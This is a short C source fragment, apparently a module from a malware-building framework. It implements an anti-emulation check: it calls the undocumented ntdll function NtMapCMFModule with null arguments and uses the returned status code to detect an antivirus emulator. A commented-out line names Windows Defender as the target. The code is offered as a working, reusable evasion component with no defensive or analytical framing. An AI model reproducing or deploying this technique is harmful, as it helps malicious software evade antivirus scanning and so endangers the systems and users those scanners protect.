//@@@headers
#include "ae_xxx.h"
//@@@endheaders

//@@@zvars
DWORD ae_ret;
//@@@endzvars

// Returns 1
SPRAYABLE_PROC(antiemu) {
  //@@@proc /name antiemu
  typedef NTSTATUS(NTAPI* LPFN_NtMapCMFModule)(void*, void*, void*, void*, void*, void*); STK_TMPVAR1D = ((LPFN_NtMapCMFModule)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtMapCMFModule"))(0, 0, 0, 0, 0, 0);
  Z(ae_ret) = STK_TMPVAR1D == 0xc000000d;
  //Z(ae_ret) = MessageBoxA(0,"are you windef","q",MB_YESNO)==IDNO;
  CUR_RETD = 1;

  //@@@endproc
}

